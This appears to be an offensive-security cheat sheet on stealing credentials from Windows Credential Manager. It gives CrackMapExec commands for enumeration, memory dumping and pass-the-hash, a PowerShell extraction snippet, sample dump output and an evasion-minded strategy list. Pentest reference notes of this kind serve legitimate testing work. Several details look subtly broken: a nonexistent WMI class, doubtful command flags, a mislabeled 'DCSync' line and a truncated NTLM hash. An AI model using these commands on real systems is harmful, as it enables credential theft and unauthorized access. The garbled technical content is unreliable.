# 🛡️ Credential Manager Attacks

---

## 🔍 Overview & Initial Enumeration

### Description of Credential Manager Attack

[Credential Manager](https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-manager) is a feature in Windows that stores user credentials and certificates. Attackers can leverage this to extract stored passwords, session tokens, or NTLM hashes from compromised machines.

> [!ABSTRACT] 
> **Objective**: Extract sensitive information (e.g., passwords, session tokens, NTLM hashes) stored in the Credential Manager of a target machine.
>
> **Tools**:
> - [[CrackMapExec]]
> - [[PowerShell]]

---

## ⚙️ Enumeration Steps

### 1. Check for Enabled Features

Use `crackmapexec` to check if the target system has enabled features such as Kerberos delegation, which can be exploited.

```bash
crackmapexec smb <IP> -u user -p 'Password' --info
```

### 2. Retrieve Credentials from Credential Manager

#### PowerShell Script for Credential Extraction

Use a PowerShell script to retrieve credentials stored in the `Wdigest` and `DPAPI` providers.

```powershell
$cred = Get-WmiObject -Query "SELECT * FROM Win32_Credential WHERE Type='1'" 
$cred.Password | ConvertTo-SecureString -AsPlainText -Force
```

> [!NOTE] 
> Ensure you have the necessary permissions or use a user with sufficient privileges to execute these commands.

---

## ⚒️ Exploitation Methods

### 3. Credential Dumping Using CrackMapExec

#### Dumps Credentials from Memory

Use `crackmapexec` to dump credentials directly from memory, especially useful for finding session tokens and hashes.

```bash
crackmapexec smb <IP> -u user -p 'Password' --wdigest
```

### 4. Pass-the-Hash (PtH) Attacks

#### Authenticate Using NTLM Hashes

Once you have NTLM hashes from the Credential Manager, use them to authenticate without needing a password.

```bash
crackmapexec smb <IP> -u user -H NTHASH --ptth
```

---

## ⚠️ Common Findings & Hazards

| Finding | Impact |
|---|---|
| Enabled Kerberos Delegation | High Privilege Escalation Risk |
| Unencrypted Stored Passwords | Direct Access to Credentials |

> [!WARNING] 
> Be cautious when handling extracted credentials as they may be used for unauthorized access.

---

## 📝 Example Output

### Raw Output from Credential Dumping

```text
[*] SMB     10.10.10.1:445      user         - DCSync (3c2f76b6d9)
[*] SMB     10.10.10.1:445      user         - NTLM Hash: e8ee22e9a97cb3061eb015
```

---

## 🧠 Mental Model & Strategy

```text
Credential Manager Attacks:
  - Enumerate Enabled Features
  - Extract Credentials from Memory or Files
  - Use NTLM Hashes for PtH
  - Identify and Exploit Unsecured Credentials
  - Avoid Detection (e.g., use low-noise techniques)
```

> [!SUCCESS] 
> Always consider the environment's security settings before attempting credential extraction.

---